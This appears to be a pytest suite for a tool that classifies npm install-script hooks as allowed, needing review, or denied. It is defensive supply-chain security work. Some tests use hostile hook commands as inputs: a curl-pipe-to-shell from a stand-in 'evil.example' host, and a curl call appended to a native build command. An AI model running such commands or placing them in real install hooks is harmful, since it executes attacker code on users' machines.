from __future__ import annotations

from ca9.analyzers.install_scripts import (
    VERDICT_ALLOW_CANDIDATE,
    VERDICT_DENY,
    VERDICT_REVIEW,
    ScriptHook,
    classify_install_scripts,
    install_hooks_from_manifest,
)


def _hook(command: str, name: str = "install") -> ScriptHook:
    return ScriptHook(name=name, command=command)


def test_benign_native_build_is_allow_candidate():
    result = classify_install_scripts(
        (_hook("node-gyp rebuild"),),
        verified_artifact_analysis=True,
    )
    assert result.verdict == VERDICT_ALLOW_CANDIDATE
    assert result.reasons == ("benign:node-gyp",)


def test_native_build_requires_verified_artifact_analysis():
    result = classify_install_scripts((_hook("node-gyp rebuild"),))
    assert result.verdict == VERDICT_REVIEW
    assert result.reasons == ("benign:node-gyp",)
    assert result.notes == ("verified-artifact-analysis-required",)


def test_benign_match_normalizes_whitespace():
    result = classify_install_scripts(
        (_hook("  prebuild-install\t  ||  node-gyp rebuild "),),
        verified_artifact_analysis=True,
    )
    assert result.verdict == VERDICT_ALLOW_CANDIDATE
    assert result.reasons == ("benign:prebuild-native",)


def test_appended_command_breaks_benign_match():
    result = classify_install_scripts((_hook("node-gyp rebuild && curl https://evil.example"),))
    assert result.verdict == VERDICT_DENY
    assert "npm-install-script-exec" in result.reasons


def test_multiline_command_cannot_become_benign_match():
    result = classify_install_scripts((_hook("node-gyp\nrebuild"),))
    assert result.verdict == VERDICT_DENY
    assert result.reasons == ("npm-install-script-control-character",)


def test_other_control_character_is_denied():
    result = classify_install_scripts((_hook("node-gyp\x00 rebuild"),))
    assert result.verdict == VERDICT_DENY
    assert result.reasons == ("npm-install-script-control-character",)


def test_suspicious_pipe_to_shell_is_denied():
    result = classify_install_scripts(
        (_hook("curl https://evil.example/x.sh | sh", "postinstall"),)
    )
    assert result.verdict == VERDICT_DENY
    assert result.reasons == ("npm-install-script-exec",)


def test_unknown_command_is_review():
    result = classify_install_scripts((_hook("./configure.sh"),))
    assert result.verdict == VERDICT_REVIEW
    assert result.reasons == ("no-benign-match",)


def test_suspicious_command_requires_a_token_boundary():
    result = classify_install_scripts((_hook("scurl assets"),))
    assert result.verdict == VERDICT_REVIEW
    assert result.reasons == ("no-benign-match",)

    result = classify_install_scripts((_hook("curl-loader assets"),))
    assert result.verdict == VERDICT_REVIEW
    assert result.reasons == ("no-benign-match",)


def test_worst_hook_wins():
    hooks = (_hook("node-gyp rebuild"), _hook("./configure.sh", "postinstall"))
    result = classify_install_scripts(hooks, verified_artifact_analysis=True)
    assert result.verdict == VERDICT_REVIEW
    assert set(result.reasons) == {"benign:node-gyp", "no-benign-match"}


def test_deny_reasons_override_benign_scripts():
    result = classify_install_scripts(
        (_hook("node-gyp rebuild"),),
        deny_reasons=("feed:MAL-2026-1",),
        verified_artifact_analysis=True,
    )
    assert result.verdict == VERDICT_DENY
    assert "feed:MAL-2026-1" in result.reasons
    assert "benign:node-gyp" in result.reasons


def test_unavailable_scripts_are_review():
    result = classify_install_scripts((), scripts_available=False)
    assert result.verdict == VERDICT_REVIEW
    assert result.reasons == ("scripts-unavailable",)


def test_missing_hooks_despite_lock_flag_is_review():
    result = classify_install_scripts(())
    assert result.verdict == VERDICT_REVIEW
    assert result.reasons == ("lock-manifest-mismatch",)


def test_skippable_note_for_husky():
    result = classify_install_scripts((_hook("husky install", "postinstall"),))
    assert result.verdict == VERDICT_REVIEW
    assert result.reasons == ("helper:husky",)
    assert result.notes == ("skippable",)


def test_patch_package_is_review_because_it_mutates_installed_code():
    result = classify_install_scripts((_hook("patch-package", "postinstall"),))
    assert result.verdict == VERDICT_REVIEW
    assert result.reasons == ("helper:patch-package",)
    assert result.notes == ("mutates-installed-code",)


def test_install_hooks_from_manifest_reads_lifecycle_hooks_only():
    manifest = {
        "scripts": {
            "preinstall": "node-gyp rebuild",
            "postinstall": "husky install",
            "prepare": "node prepare.js",
            "test": "jest",
            "build": "tsc",
        }
    }
    hooks = install_hooks_from_manifest(manifest)
    assert [(hook.name, hook.command) for hook in hooks] == [
        ("preinstall", "node-gyp rebuild"),
        ("postinstall", "husky install"),
    ]


def test_install_hooks_from_manifest_includes_prepare_when_requested():
    manifest = {
        "scripts": {
            "install": "node-gyp rebuild",
            "prepare": "node prepare.js",
        }
    }
    hooks = install_hooks_from_manifest(manifest, include_prepare=True)
    assert [(hook.name, hook.command) for hook in hooks] == [
        ("install", "node-gyp rebuild"),
        ("prepare", "node prepare.js"),
    ]


def test_install_hooks_from_manifest_preserves_newlines_for_rejection():
    hooks = install_hooks_from_manifest({"scripts": {"install": " node-gyp\nrebuild "}})
    assert hooks == (_hook("node-gyp\nrebuild"),)


def test_install_hooks_from_manifest_handles_missing_scripts():
    assert install_hooks_from_manifest({}) == ()
    assert install_hooks_from_manifest({"scripts": None}) == ()
    assert install_hooks_from_manifest({"scripts": {"install": "   "}}) == ()
